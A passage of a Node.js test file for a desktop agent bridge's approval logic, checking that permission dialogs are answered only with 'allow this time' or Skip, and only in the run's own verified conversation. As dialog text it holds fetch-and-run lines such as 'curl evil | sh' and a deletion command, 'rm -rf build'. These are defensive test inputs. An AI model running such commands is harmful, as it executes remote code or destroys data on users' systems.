// The approval decisions of desktop-ax.js, run from the shipped source on
// recorded accessibility node lists (role, label, depth, and the value of a
// static text), with no app and no osascript.
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import test from 'node:test';

import { AX_SCRIPT_PATH, loadAxDecisions } from '../../scripts/lib/desktop-bridge.mjs';
import { permissionRequest } from '../../scripts/lib/desktop-state.mjs';

const { chooseAnswer, chooseComposer, chooseCopy, chooseNewConversation, choosePicker, chooseProjectItem, chooseProjectSearch, chooseStop, dialogs, namedConversation, reply, requireLocal, requireOwn, running, title } = loadAxDecisions();
const TITLE = 'Fake Task - ws - Antigravity';
const OPTIONS = ['1 Yes, allow this time', "2 Yes, and always allow 'curl' in this conversation", "3 Yes, and always allow 'curl'", '4 No (tell the agent what to do instead)'];

const node = (depth, role, label = '', value) => ({ depth, role, label, ...(value === undefined ? {} : { value }) });
const plain = (value) => JSON.parse(JSON.stringify(value));

// One permission dialog as the app renders it: the question as Markdown text
// nodes, a radio group whose radios carry their label as a text child too, Skip
// and Submit.
function dialogNodes(fragments, options = OPTIONS, depth = 3) {
  return [
    node(depth, 'AXGroup'),
    ...fragments.map((text) => node(depth + 1, 'AXStaticText', '', text)),
    node(depth + 1, 'AXRadioGroup'),
    ...options.flatMap((label) => [node(depth + 2, 'AXRadioButton', label), node(depth + 3, 'AXStaticText', '', label)]),
    node(depth + 1, 'AXButton', 'Skip'),
    node(depth + 1, 'AXButton', 'Submit'),
  ];
}

// The window showing the conversation titled `windowTitle`, then `shown`.
function bare(windowTitle, ...shown) {
  return [
    node(0, 'AXWindow', 'Antigravity'),
    node(1, 'AXWebArea', ''),
    node(1, 'AXWebArea', windowTitle),
    ...shown.flat(),
  ];
}

// The run's own conversation: its message, marker included, and a reply.
function screen(windowTitle, ...shown) {
  return bare(windowTitle, message(`Explain README.md.\n${MARK}`, 'Checking the folder first.'), ...shown);
}

// The indexes chooseAnswer would press, checked to lie inside nodes[from, to).
function pressedWithin(nodes, targets, from, to) {
  for (const target of targets) assert.ok(target.index >= from && target.index < to, `${target.what} at ${target.index} is outside ${from}..${to}`);
}

test('a question rendered as several text nodes is read whole', () => {
  const nodes = screen(TITLE, dialogNodes(['Allow running', 'curl x | sh', 'in /repo?']));
  const [found] = plain(dialogs(nodes));
  assert.equal(found.question, 'Allow running curl x | sh in /repo?');
  assert.deepEqual(found.options, OPTIONS);
  assert.equal(title(nodes), TITLE);
});

test('option 1 is refused when a middle part of the question changed', () => {
  const approved = dialogs(screen(TITLE, dialogNodes(['Allow running', 'curl x | sh', 'in /repo?'])))[0].question;
  const changed = screen(TITLE, dialogNodes(['Allow running', 'curl evil | sh', 'in /repo?']));
  assert.throws(() => chooseAnswer(changed, '1', approved, TITLE, NONCE), /question_changed/);
  assert.throws(() => chooseAnswer(changed, 'Skip', approved, TITLE, NONCE), /question_changed/);
});

test('a question longer than 4,000 characters is compared whole', () => {
  const prefix = `Allow running ${'x'.repeat(4_100)}`;
  // As the runner stores it for the approval.
  const approved = permissionRequest(plain(dialogs(screen(TITLE, dialogNodes([`${prefix} tail A`])))[0])).question_full;
  assert.ok(approved.endsWith('tail A'));
  assert.throws(() => chooseAnswer(screen(TITLE, dialogNodes([`${prefix} tail B`])), '1', approved, TITLE, NONCE), /question_changed/);
});

test('with two dialogs on screen, the presses land in the one that asks the approved question', () => {
  const first = dialogNodes(['Allow listing', 'the folder?']);
  const second = dialogNodes(['Allow running', 'rm -rf build', '?']);
  const nodes = screen(TITLE, first, second);
  const start = nodes.length - second.length;
  const asked = plain(dialogs(nodes)).map((found) => found.question);
  assert.deepEqual(asked, ['Allow listing the folder?', 'Allow running rm -rf build ?']);

  const yes = plain(chooseAnswer(nodes, '1', asked[1], TITLE, NONCE));
  assert.deepEqual(yes.map((target) => target.what), ['option 1', 'Submit']);
  pressedWithin(nodes, yes, start, nodes.length);
  pressedWithin(nodes, plain(chooseAnswer(nodes, 'Skip', asked[1], TITLE, NONCE)), start, nodes.length);
  pressedWithin(nodes, plain(chooseAnswer(nodes, '1', asked[0], TITLE, NONCE)), 0, start);
});

test('one group holding two option 1 radios is refused as ambiguous', () => {
  const merged = dialogNodes(['Allow running ls?'], [...OPTIONS, '1 Yes, allow this time']);
  assert.throws(() => chooseAnswer(screen(TITLE, merged), '1', 'Allow running ls?', TITLE, NONCE), /several_dialogs/);
});

test('another conversation on screen refuses every answer', () => {
  const nodes = screen('Other Chat - ws - Antigravity', dialogNodes(['Allow running ls?']));
  assert.throws(() => chooseAnswer(nodes, '1', 'Allow running ls?', TITLE, NONCE), /other_conversation/);
  assert.throws(() => chooseAnswer(nodes, 'Skip', 'Allow running ls?', TITLE, NONCE), /other_conversation/);
});

test('option 1 is refused unless its label is exactly "allow this time"', () => {
  const nodes = screen(TITLE, dialogNodes(['Allow running ls?'], ["1 Yes, and always allow 'ls'", ...OPTIONS.slice(1)]));
  assert.throws(() => chooseAnswer(nodes, '1', 'Allow running ls?', TITLE, NONCE), /not_found: option 1/);
});

test('only option 1 or Skip is ever chosen, and only with the question and title', () => {
  const nodes = screen(TITLE, dialogNodes(['Allow running ls?']));
  for (const option of ['2', '3', '4', 'Submit', '']) assert.throws(() => chooseAnswer(nodes, option, 'Allow running ls?', TITLE, NONCE), /only 1 or Skip/);
  assert.throws(() => chooseAnswer(nodes, '1', undefined, TITLE, NONCE), /usage/);
  assert.throws(() => chooseAnswer(nodes, '1', 'Allow running ls?', undefined, NONCE), /usage/);
  assert.throws(() => chooseAnswer(screen(TITLE), '1', 'Allow running ls?', TITLE, NONCE), /not_found: permission dialog/);
});

// The window as Send reads it: the sidebar of project ws listing `names`, and
// the conversation's web area titled `windowTitle`, showing `shown`.
const sidebar = (windowTitle, names, ...shown) => [
  node(0, 'AXWindow', 'Antigravity'),
  node(1, 'AXWebArea', ''),
  node(2, 'AXButton', 'ws'),
  node(2, 'AXLink', 'New Conversation in Project'),
  ...names.map((name) => node(2, 'AXStaticText', '', name)),
  node(1, 'AXWebArea', windowTitle),
  ...shown.flat(),
];

test('after Send a titled conversation is adopted only when it shows the run\'s own message', () => {
  const mine = message(`Explain README.md.\n${MARK}`);
  assert.equal(namedConversation(sidebar('Antigravity', ['Other Chat'], mine), 'Antigravity', 'ws', NONCE), null, 'not titled yet');
  assert.deepEqual(plain(namedConversation(sidebar(TITLE, ['Other Chat', 'Fake Task'], mine), 'Antigravity', 'ws', NONCE)), { title: TITLE });
  // A new conversation the user created and the app titled meanwhile: newly listed, but not the run's message.
  assert.equal(namedConversation(sidebar('Rival Chat - ws - Antigravity', ['Other Chat', 'Rival Chat'], message('Another task.')), 'Antigravity', 'ws', NONCE), null);
  // Nor a namesake, nor one where only the agent repeats the marker, nor one whose message the tree does not show.
  assert.equal(namedConversation(sidebar(TITLE, ['Fake Task', 'Fake Task'], message('Another task.')), 'Antigravity', 'ws', NONCE), null);
  assert.equal(namedConversation(sidebar(TITLE, ['Fake Task'], message('Another task.', MARK)), 'Antigravity', 'ws', NONCE), null);
  assert.equal(namedConversation(sidebar(TITLE, ['Fake Task']), 'Antigravity', 'ws', NONCE), null);
  // The marker in the sidebar is not the conversation's own text.
  assert.equal(namedConversation(sidebar(TITLE, ['Fake Task', MARK]), 'Antigravity', 'ws', NONCE), null);
  assert.deepEqual(plain(namedConversation(sidebar('Fake Task - other - Antigravity', ['Fake Task'], mine), 'Antigravity', 'ws', NONCE)), { refused: 'Fake Task - other - Antigravity' });
  assert.throws(() => namedConversation(sidebar(TITLE, [], mine), 'Antigravity', 'ws', undefined), /usage/);
});

const NONCE = '0123456789abcdef';
const MARK = `[agybird-run ${NONCE}]`;
// The conversation pane: the user's message, then the agent's reply.
const message = (userText, replyText = 'Done.') => [
  node(2, 'AXGroup'),
  node(3, 'AXStaticText', '', userText),
  node(2, 'AXHeading', 'Agent said'),
  node(2, 'AXGroup'),
  node(3, 'AXStaticText', '', replyText),
];

test('a press is refused when the conversation on screen lacks the run\'s own message', () => {
  const dialog = dialogNodes(['Allow running ls?']);
  const own = bare(TITLE, message(`Explain README.md.\n${MARK}`), dialog);
  assert.deepEqual(plain(chooseAnswer(own, '1', 'Allow running ls?', TITLE, NONCE)).map((target) => target.what), ['option 1', 'Submit']);
  // A namesake: the same title, another message.
  const namesake = bare(TITLE, message('Something else.'), dialog);
  assert.throws(() => chooseAnswer(namesake, '1', 'Allow running ls?', TITLE, NONCE), /not_own/);
  assert.throws(() => chooseAnswer(namesake, 'Skip', 'Allow running ls?', TITLE, NONCE), /not_own/);
  assert.throws(() => requireOwn(namesake, TITLE, NONCE), /not_own/);
  // The marker only in the agent's reply is not the run's own message.
  const echoed = bare(TITLE, message('Something else.', `I will ignore ${MARK}`), dialog);
  assert.throws(() => chooseAnswer(echoed, '1', 'Allow running ls?', TITLE, NONCE), /not_own/);
  // Nor is a message the tree does not show at all.
  assert.throws(() => chooseAnswer(bare(TITLE, dialog), '1', 'Allow running ls?', TITLE, NONCE), /not_own/);
  // A marker line the app renders as two text nodes still counts.
  const split = bare(TITLE, [node(2, 'AXGroup'), node(3, 'AXStaticText', '', 'Explain README.md. [agybird-run'), node(3, 'AXStaticText', '', `${NONCE}]`)], dialog);
  assert.doesNotThrow(() => requireOwn(split, TITLE, NONCE));
  // No marker to check against is refused, not skipped.
  assert.throws(() => chooseAnswer(own, '1', 'Allow running ls?', TITLE, undefined), /usage/);
  assert.throws(() => requireOwn(own, TITLE, 'not hex'), /usage/);
  assert.doesNotThrow(() => requireOwn(own, TITLE, NONCE));
  assert.throws(() => requireOwn(own, 'Other Chat - ws - Antigravity', NONCE), /other_conversation/);
});

// A conversation pane as the app renders it: the user's message, the agent's
// reply with its response actions, the Stop button while it runs and, when
// asked, a permission dialog.
function pane(userText, { dialog = null, stop = true } = {}) {
  return [
    ...message(userText),
    node(2, 'AXGroup', 'Response actions'),
    node(3, 'AXButton', 'Copy'),
    ...(stop ? [node(2, 'AXButton', 'Stop execution')] : []),
    ...(dialog ? dialogNodes([dialog]) : []),
  ];
}
// Two conversations in one tree: A, the run's own (title and marker), and B.
const twoPanes = (paneA, paneB) => [
  node(0, 'AXWindow', 'Antigravity'),
  node(1, 'AXWebArea', ''),
  node(1, 'AXWebArea', TITLE),
  ...paneA,
  node(0, 'AXWindow', 'Antigravity'),
  node(1, 'AXWebArea', 'Second Chat - ws - Antigravity'),
  ...paneB,
];

test('with two conversation panes, an answer matching only the other pane\'s dialog is refused', () => {
  const nodes = twoPanes(pane(`Explain README.md.\n${MARK}`, { stop: false }), pane('Another task.', { dialog: 'Allow running ls?', stop: false }));
  assert.throws(() => chooseAnswer(nodes, '1', 'Allow running ls?', TITLE, NONCE), /several_conversations/);
  assert.throws(() => chooseAnswer(nodes, 'Skip', 'Allow running ls?', TITLE, NONCE), /several_conversations/);
  assert.throws(() => dialogs(nodes), /several_conversations/);
  assert.throws(() => title(nodes), /several_conversations/);
});

test('with two conversation panes, Stop, Copy and the reply are never taken from either', () => {
  const nodes = twoPanes(message(`Explain README.md.\n${MARK}`), pane('Another task.'));
  assert.throws(() => chooseStop(nodes, TITLE, NONCE), /several_conversations/);
  assert.throws(() => chooseCopy(nodes, TITLE, NONCE), /several_conversations/);
  assert.throws(() => running(nodes), /several_conversations/);
  assert.throws(() => reply(nodes), /several_conversations/);
});

test('a dialog, Stop, Copy or reply outside the verified conversation is refused, not pressed', () => {
  // One titled conversation, the run's own, and the controls in the untitled web area beside it.
  const outside = [
    node(0, 'AXWindow', 'Antigravity'),
    node(1, 'AXWebArea', ''),
    ...pane('Another task.', { dialog: 'Allow running ls?' }),
    node(1, 'AXWebArea', TITLE),
    ...message(`Explain README.md.\n${MARK}`),
  ];
  assert.throws(() => chooseAnswer(outside, '1', 'Allow running ls?', TITLE, NONCE), /outside_conversation/);
  assert.throws(() => chooseAnswer(outside, 'Skip', 'Allow running ls?', TITLE, NONCE), /outside_conversation/);
  assert.throws(() => chooseStop(outside, TITLE, NONCE), /outside_conversation/);
  assert.throws(() => chooseCopy(outside, TITLE, NONCE), /outside_conversation/);
  assert.throws(() => running(outside), /outside_conversation/);
  // Inside the conversation but missing: not found, nothing pressed.
  const bareOwn = bare(TITLE, message(`Explain README.md.\n${MARK}`));
  assert.throws(() => chooseStop(bareOwn, TITLE, NONCE), /not_found: Stop execution/);
  assert.throws(() => chooseCopy(bareOwn, TITLE, NONCE), /not_found: Response actions/);
  assert.equal(running(bareOwn), false);
});

test('a single conversation pane still yields its dialog, Stop, Copy and reply, all inside it', () => {
  const nodes = bare(TITLE, pane(`Explain README.md.\n${MARK}`, { dialog: 'Allow running ls?' }));
  const start = nodes.findIndex((entry) => entry.role === 'AXWebArea' && entry.label === TITLE);
  assert.deepEqual(plain(chooseAnswer(nodes, '1', 'Allow running ls?', TITLE, NONCE)).map((target) => target.what), ['option 1', 'Submit']);
  pressedWithin(nodes, plain(chooseAnswer(nodes, 'Skip', 'Allow running ls?', TITLE, NONCE)), start + 1, nodes.length);
  const stop = chooseStop(nodes, TITLE, NONCE);
  assert.equal(nodes[stop].label, 'Stop execution');
  const copy = chooseCopy(nodes, TITLE, NONCE);
  assert.equal(nodes[copy].label, 'Copy');
  assert.ok(stop > start && copy > start);
  assert.equal(running(nodes), true);
  assert.equal(reply(nodes), 'Done.');
  assert.equal(title(nodes), TITLE);
  // Stop and Copy check the conversation as an answer does.
  assert.throws(() => chooseStop(nodes, 'Other Chat - ws - Antigravity', NONCE), /other_conversation/);
  assert.throws(() => chooseCopy(bare(TITLE, pane('Something else.')), TITLE, NONCE), /not_own/);
});

// The composer and Send of a pane, as the app renders them below the conversation.
const composerNodes = (depth = 2) => [node(depth, 'AXTextArea', 'Message input'), node(depth, 'AXButton', 'Send message')];
const CONTROLS = ['Message input', 'Send message'];

test('with two panes holding composers, the composer and Send are taken from neither', () => {
  // The run's new, untitled conversation, and an unlabelled pane before it with its own composer.
  const untitledRival = [
    node(0, 'AXWindow', 'Antigravity'),
    node(1, 'AXWebArea', ''),
    ...composerNodes(),
    node(1, 'AXWebArea', 'Antigravity'),
    ...composerNodes(),
  ];
  for (const control of CONTROLS) assert.throws(() => chooseComposer(untitledRival, 'Antigravity', control), new RegExp(`outside_conversation: ${control}`));
  // Once titled, a second titled pane with a composer refuses both as well.
  const titled = twoPanes([...message(`Explain README.md.\n${MARK}`), ...composerNodes()], [...message('Another task.'), ...composerNodes()]);
  for (const control of CONTROLS) assert.throws(() => chooseComposer(titled, TITLE, control), /several_conversations/);
});

test('the run\'s composer or Send outside the conversation web area is refused', () => {
  // The only composer sits in the window beside the web area, not inside it.
  const beside = [node(0, 'AXWindow', 'Antigravity'), node(1, 'AXWebArea', ''), node(1, 'AXWebArea', 'Antigravity'), node(2, 'AXGroup'), ...composerNodes(1)];
  for (const control of CONTROLS) assert.throws(() => chooseComposer(beside, 'Antigravity', control), new RegExp(`outside_conversation: ${control}`));
  // Two inside the one conversation cannot say which is the run's either.
  const doubled = bare('Antigravity', composerNodes(), composerNodes());
  for (const control of CONTROLS) assert.throws(() => chooseComposer(doubled, 'Antigravity', control), new RegExp(`several_controls: ${control}`));
});

test('a single pane still yields its composer and Send, inside it', () => {
  for (const shownTitle of ['Antigravity', TITLE]) {
    const nodes = bare(shownTitle, shownTitle === TITLE ? message(`Explain README.md.\n${MARK}`) : [], composerNodes());
    const start = nodes.findIndex((entry) => entry.role === 'AXWebArea' && entry.label === shownTitle);
    for (const control of CONTROLS) {
      const index = chooseComposer(nodes, shownTitle, control);
      assert.equal(nodes[index].label, control);
      assert.ok(index > start);
    }
    // Another conversation on screen refuses both; none there yet is -1, so Send can wait for it.
    assert.throws(() => chooseComposer(nodes, 'Other Chat - ws - Antigravity', 'Message input'), /other_conversation/);
  }
  assert.equal(chooseComposer(bare('Antigravity', [node(2, 'AXTextArea', 'Message input')]), 'Antigravity', 'Send message'), -1);
  assert.throws(() => chooseComposer(bare('Antigravity', composerNodes()), 'Antigravity', 'Stop execution'), /usage/);
});

// A tree read that stopped at its node cap before the end, as walk() marks it.
const cut = (nodes) => Object.assign(nodes, { truncated: true });

test('a tree read cut off at the node cap is never trusted as the whole app', () => {
  const full = () => bare(TITLE, pane(`Explain README.md.\n${MARK}`, { dialog: 'Allow running ls?' }));
  const nodes = cut(full());
  // What lies past the cut cannot be ruled out: a second conversation, a
  // rival composer or Send, the Stop that says the turn still runs, the rest
  // of the reply. So nothing is read, chosen or pressed on such a read.
  for (const read of [() => title(nodes), () => running(nodes), () => reply(nodes), () => dialogs(nodes), () => requireOwn(nodes, TITLE, NONCE)]) assert.throws(read, /^Error: truncated/);
  assert.throws(() => chooseAnswer(nodes, '1', 'Allow running ls?', TITLE, NONCE), /truncated/);
  assert.throws(() => chooseAnswer(nodes, 'Skip', 'Allow running ls?', TITLE, NONCE), /truncated/);
  assert.throws(() => chooseStop(nodes, TITLE, NONCE), /truncated/);
  assert.throws(() => chooseCopy(nodes, TITLE, NONCE), /truncated/);
  for (const control of CONTROLS) assert.throws(() => chooseComposer(cut(bare('Antigravity', composerNodes())), 'Antigravity', control), /truncated/);
  assert.throws(() => namedConversation(cut(bare(TITLE, message(`Explain README.md.\n${MARK}`))), 'Antigravity', 'ws', NONCE), /truncated/);
  // A turn whose Stop lies past the cut does not read as ended.
  assert.throws(() => running(cut(bare(TITLE, pane(`Explain README.md.\n${MARK}`, { stop: false })))), /truncated/);
  // The same trees read whole still decide as before.
  const whole = full();
  assert.equal(running(whole), true);
  assert.equal(whole[chooseStop(whole, TITLE, NONCE)].label, 'Stop execution');
  for (const control of CONTROLS) assert.equal(bare('Antigravity', composerNodes())[chooseComposer(bare('Antigravity', composerNodes()), 'Antigravity', control)].label, control);
});

test('the decisions region calls no accessibility API', () => {
  const source = readFileSync(AX_SCRIPT_PATH, 'utf8');
  const region = source.slice(source.indexOf('// desktop-decisions:start'), source.indexOf('// desktop-decisions:end'));
  assert.ok(region.length > 0);
  assert.doesNotMatch(region, /\$[.(]|ObjC|Application\(|delay\(/);
});

// Antigravity 2.36: one titled web area holds the sidebar, with a single New
// Conversation link, and the conversation, whose composer picks where the
// agent runs and the project. `menu` lists the projects the open project
// picker shows, as the app renders each: the name as its own text, then a
// Project Settings button.
function newConversation236({ current = 'studio', where = 'This Computer', menu = null, links = 1, windowTitle = 'Antigravity' } = {}) {
  return [
    node(0, 'AXWindow', 'Antigravity'),
    node(1, 'AXWebArea', ''),
    node(1, 'AXWebArea', windowTitle),
    node(2, 'AXGroup', 'Sidebar'),
    ...Array.from({ length: links }, () => [node(3, 'AXLink', 'New Conversation'), node(4, 'AXStaticText', '', 'New Conversation')]).flat(),
    node(2, 'AXGroup'),
    ...(where === null ? [] : [node(3, 'AXPopUpButton', `Where the agent runs, current: ${where}`)]),
    node(3, 'AXPopUpButton', `Select project, current: ${current}`),
    ...(menu === null ? [] : [
      node(4, 'AXMenu', `Select project, current: ${current}`),
      node(5, 'AXTextField', 'Search Projects'),
      ...menu.flatMap((name) => [node(5, 'AXMenuItem', `${name} Project Settings`), node(6, 'AXGroup'), node(7, 'AXStaticText', '', name), node(6, 'AXButton', 'Project Settings')]),
      node(5, 'AXMenuItem', 'New Project'),
      node(5, 'AXMenuItem', 'No Project Project Settings'),
    ]),
    node(3, 'AXPopUpButton', 'Branch, current: main'),
    node(3, 'AXTextArea', 'Message input'),
    node(3, 'AXPopUpButton', 'Select model, current: Gemini 3.8 Flash Medium'),
    node(3, 'AXPopUpButton', 'Agent permissions preset selector, current: Request Review'),
  ];
}
const NEAR_NAMES = ['agybird-wt-agy', 'pin-agybird-0-4-5', 'agybird', 'agybird-codex-task-2'];

test('a new conversation opens from the 2.35 sidebar link of the project, or the one 2.36 link', () => {
  const old = sidebar('Antigravity', ['Other Chat']);
  assert.deepEqual(plain(chooseNewConversation(old, 'ws')), { layout: 'sidebar', index: 3 });
  assert.throws(() => chooseNewConversation(old, 'other'), /not_found: project other/);
  const nodes = newConversation236();
  const opened = plain(chooseNewConversation(nodes, 'agybird'));
  assert.equal(opened.layout, 'picker');
  assert.equal(nodes[opened.index].label, 'New Conversation');
  assert.equal(nodes[opened.index].role, 'AXLink');
  assert.throws(() => chooseNewConversation(newConversation236({ links: 2 }), 'agybird'), /several_controls: New Conversation/);
  assert.throws(() => chooseNewConversation(newConversation236({ links: 0 }), 'agybird'), /not_found: New Conversation/);
});

test('the 2.36 project picker is read only in the new conversation, and the agent must run on this computer', () => {
  const nodes = newConversation236();
  const picker = plain(choosePicker(nodes, 'Select project'));
  assert.equal(picker.current, 'studio');
  assert.equal(nodes[picker.index].label, 'Select project, current: studio');
  assert.equal(plain(choosePicker(nodes, 'Where the agent runs')).current, 'This Computer');
  assert.doesNotThrow(() => requireLocal(nodes));
  assert.throws(() => requireLocal(newConversation236({ where: 'Cloud' })), /not_local: the agent runs on Cloud/);
  assert.throws(() => requireLocal(newConversation236({ where: null })), /not_found: Where the agent runs/);
  // Another conversation's composer is not the new conversation's.
  assert.throws(() => choosePicker(newConversation236({ windowTitle: TITLE }), 'Select project'), /other_conversation/);
  const twice = newConversation236();
  twice.splice(8, 0, node(3, 'AXPopUpButton', 'Select project, current: yody'));
  assert.throws(() => choosePicker(twice, 'Select project'), /several_controls: Select project/);
});

test('the project is the menu item whose own name is exactly the project, never a near-name', () => {
  const nodes = newConversation236({ menu: NEAR_NAMES });
  const search = chooseProjectSearch(nodes);
  assert.equal(nodes[search].label, 'Search Projects');
  const item = chooseProjectItem(nodes, 'agybird');
  assert.equal(nodes[item].label, 'agybird Project Settings');
  assert.equal(nodes[item + 2].value, 'agybird');
  assert.equal(nodes[chooseProjectItem(nodes, 'agybird-wt-agy')].label, 'agybird-wt-agy Project Settings');
  // Only near-names listed, or none at all: nothing to press.
  assert.throws(() => chooseProjectItem(newConversation236({ menu: ['agybird-wt-agy', 'pin-agybird-0-4-5'] }), 'agybird'), /not_found: project agybird/);
  assert.throws(() => chooseProjectItem(newConversation236({ menu: [] }), 'agybird'), /not_found: project agybird/);
  // The label alone is not the name: the item's own text must match.
  const relabelled = newConversation236({ menu: ['agybird-x'] });
  relabelled.find((entry) => entry.label === 'agybird-x Project Settings').label = 'agybird Project Settings';
  assert.throws(() => chooseProjectItem(relabelled, 'agybird'), /not_found: project agybird/);
  // Two items named exactly the project cannot be told apart.
  assert.throws(() => chooseProjectItem(newConversation236({ menu: ['agybird', 'agybird'] }), 'agybird'), /several_controls: project agybird/);
  // No open picker menu: nothing is searched or pressed.
  assert.throws(() => chooseProjectSearch(newConversation236()), /not_found: project picker/);
  assert.throws(() => chooseProjectItem(newConversation236(), 'agybird'), /not_found: project picker/);
  assert.throws(() => chooseProjectItem(nodes, 'No Project'), /not_found: project No Project/);
});

// A 2.36 conversation: the user's message, then the agent's turn. While it
// runs the turn shows "Agent working" and the composer a Cancel button; once
// done, "Agent said" heads several groups (the time worked, the text, a list)
// before the response actions.
function conversation236(userText, { done = true, replyTexts = ['READY', 'Second line.'] } = {}) {
  return bare(TITLE,
    node(2, 'AXHeading', 'You said'),
    node(2, 'AXGroup'),
    node(3, 'AXStaticText', '', userText),
    ...(done
      ? [
        node(2, 'AXHeading', 'Agent said'),
        node(2, 'AXGroup'),
        node(3, 'AXButton', 'Worked for 2m'),
        node(2, 'AXGroup'),
        node(3, 'AXStaticText', '', replyTexts[0]),
        node(2, 'AXList'),
        node(3, 'AXStaticText', '', replyTexts[1]),
        node(2, 'AXGroup', 'Response actions'),
        node(3, 'AXButton', 'Copy'),
      ]
      : [node(2, 'AXHeading', 'Agent working'), node(3, 'AXStaticText', '', 'Agent working')]),
    node(2, 'AXTextArea', 'Message input'),
    ...(done ? [] : [node(2, 'AXButton', 'Cancel (⌃C)')]),
  );
}

test('on 2.36 a turn runs while Cancel shows, and Stop presses that Cancel', () => {
  const going = conversation236(`Say READY.\n${MARK}`, { done: false });
  assert.equal(running(going), true);
  assert.equal(going[chooseStop(going, TITLE, NONCE)].label, 'Cancel (⌃C)');
  assert.equal(reply(going), null);
  const ended = conversation236(`Say READY.\n${MARK}`);
  assert.equal(running(ended), false);
  assert.throws(() => chooseStop(ended, TITLE, NONCE), /not_found: Stop execution/);
});

test('on 2.36 the reply is every group after "Agent said", up to its response actions', () => {
  const nodes = conversation236(`Say READY.\n${MARK}`);
  assert.equal(reply(nodes), 'READY\nSecond line.');
  assert.equal(nodes[chooseCopy(nodes, TITLE, NONCE)].label, 'Copy');
  assert.doesNotThrow(() => requireOwn(nodes, TITLE, NONCE));
  // The marker repeated anywhere in the agent's reply is not the run's own message.
  const echoed = conversation236('Another task.', { replyTexts: ['READY', MARK] });
  assert.throws(() => requireOwn(echoed, TITLE, NONCE), /not_own/);
});

test('on 2.36 a marker in the sidebar, inside the titled web area, is not the conversation\'s own message', () => {
  // Another conversation, unmarked, while the sidebar lists a chat whose title holds the run's marker.
  const nodes = conversation236('Another task.');
  const sidebarAt = nodes.findIndex((entry) => entry.role === 'AXWebArea' && entry.label === TITLE) + 1;
  nodes.splice(sidebarAt, 0, node(2, 'AXGroup', 'Sidebar'), node(3, 'AXLink', 'New Conversation'), node(3, 'AXStaticText', '', `Chat ${MARK}`));
  assert.throws(() => requireOwn(nodes, TITLE, NONCE), /not_own/);
  assert.equal(namedConversation(nodes, 'Antigravity', 'ws', NONCE), null);
  // The run's own message still counts with the same sidebar beside it.
  const own = conversation236(`Say READY.\n${MARK}`);
  own.splice(sidebarAt, 0, node(2, 'AXGroup', 'Sidebar'), node(3, 'AXStaticText', '', 'Other Chat'));
  assert.doesNotThrow(() => requireOwn(own, TITLE, NONCE));
});

test('the project menu is searched and pressed only in the untitled new conversation', () => {
  const titled = newConversation236({ windowTitle: TITLE, menu: ['agybird'] });
  assert.throws(() => chooseProjectSearch(titled), /other_conversation/);
  assert.throws(() => chooseProjectItem(titled, 'agybird'), /other_conversation/);
});

// The 2.36 sidebar as the spike read it (docs/verification/2026-11-28-desktop-spike-projects-sidebar.md, F3).
function sidebarNodes() {
  const row = (title, project, depth = 24) => [
    { depth, role: 'AXGroup', label: '' },
    { depth: depth + 3, role: 'AXLink', label: title },
    { depth: depth + 3, role: 'AXGroup', label: '' },
    { depth: depth + 4, role: 'AXStaticText', label: '', value: title },
    { depth: depth + 4, role: 'AXStaticText', label: '', value: project },
    { depth: depth + 3, role: 'AXGroup', label: '' },
    { depth: depth + 4, role: 'AXButton', label: 'Archive conversation' },
  ];
  return [
    { depth: 0, role: 'AXWindow', label: 'Antigravity' },
    { depth: 16, role: 'AXGroup', label: 'Sidebar' },
    { depth: 25, role: 'AXHeading', label: 'Pinned Conversations' },
    ...row('Review Notes', 'studio'),
    { depth: 25, role: 'AXHeading', label: 'Conversations' },
    { depth: 27, role: 'AXHeading', label: 'In Progress' },
    ...row('Code Review', 'huly-skill'),
    { depth: 27, role: 'AXHeading', label: 'Blocked' },
    ...row('Code Review', 'agybird'),
    { depth: 27, role: 'AXHeading', label: 'Idle' },
    ...row('Code Review', 'agybird'),
    ...row('Other Task', 'agybird'),
  ];
}

// A conversation's own text, beside the sidebar: rendered Markdown with a
// status heading and a link shaped like a row.
function spoofNodes() {
  return [
    { depth: 16, role: 'AXGroup', label: 'Conversation' },
    { depth: 17, role: 'AXHeading', label: 'Idle' },
    { depth: 17, role: 'AXGroup', label: '' },
    { depth: 18, role: 'AXLink', label: 'Code Review' },
    { depth: 18, role: 'AXStaticText', label: '', value: 'Code Review' },
    { depth: 18, role: 'AXStaticText', label: '', value: 'agybird' },
  ];
}

test('the sidebar reads each row under its status heading, matched by title and project', () => {
  const { sidebarRows, sidebarState } = loadAxDecisions();
  const rows = sidebarRows(sidebarNodes());
  assert.deepEqual(JSON.parse(JSON.stringify(rows.map((row) => [row.title, row.project, row.status]))), [
    ['Review Notes', 'studio', null],
    ['Code Review', 'huly-skill', 'In Progress'],
    ['Code Review', 'agybird', 'Blocked'],
    ['Code Review', 'agybird', 'Idle'],
    ['Other Task', 'agybird', 'Idle'],
  ]);
  const shown = sidebarState(sidebarNodes(), 'Code Review', 'agybird');
  assert.equal(shown.grouped, true);
  assert.deepEqual(JSON.parse(JSON.stringify(shown.rows.map((row) => row.status))), ['Blocked', 'Idle'], 'a namesake in another project is not the run\'s');
  assert.deepEqual(sidebarState(sidebarNodes().filter((node) => !/^(In Progress|Blocked|Idle)$/.test(node.label)), 'Other Task', 'agybird').grouped, false);
});

test('only the one Sidebar group is read: conversation text shaped like a row or a heading is not', () => {
  const { sidebarRows, sidebarState } = loadAxDecisions();
  const spoofed = sidebarState([...sidebarNodes(), ...spoofNodes()], 'Code Review', 'agybird');
  assert.deepEqual(JSON.parse(JSON.stringify(spoofed.rows.map((row) => row.status))), ['Blocked', 'Idle']);
  const alone = sidebarState([{ depth: 0, role: 'AXWindow', label: 'Antigravity' }, ...spoofNodes()], 'Code Review', 'agybird');
  assert.equal(alone.grouped, false, 'a heading outside the sidebar does not group it');
  assert.equal(alone.rows.length, 0);
  const twice = [...sidebarNodes(), { depth: 16, role: 'AXGroup', label: 'Sidebar' }];
  assert.equal(sidebarRows(twice).length, 0, 'two sidebars: none is trusted');
});

test('the Load older messages button is taken only in the conversation named, outside the sidebar', () => {
  const { olderButton } = loadAxDecisions();
  const TITLE = 'Long Task - ws - Antigravity';
  const nodes = [
    { depth: 0, role: 'AXWindow', label: 'Antigravity' },
    { depth: 1, role: 'AXWebArea', label: TITLE },
    { depth: 2, role: 'AXGroup', label: 'Sidebar' },
    { depth: 3, role: 'AXButton', label: 'Load older messages, showing 1 of 2' },
    { depth: 2, role: 'AXButton', label: 'Load older messages, showing 50 of 55' },
    { depth: 2, role: 'AXStaticText', label: '', value: 'reply' },
  ];
  assert.equal(olderButton(nodes, TITLE), 4);
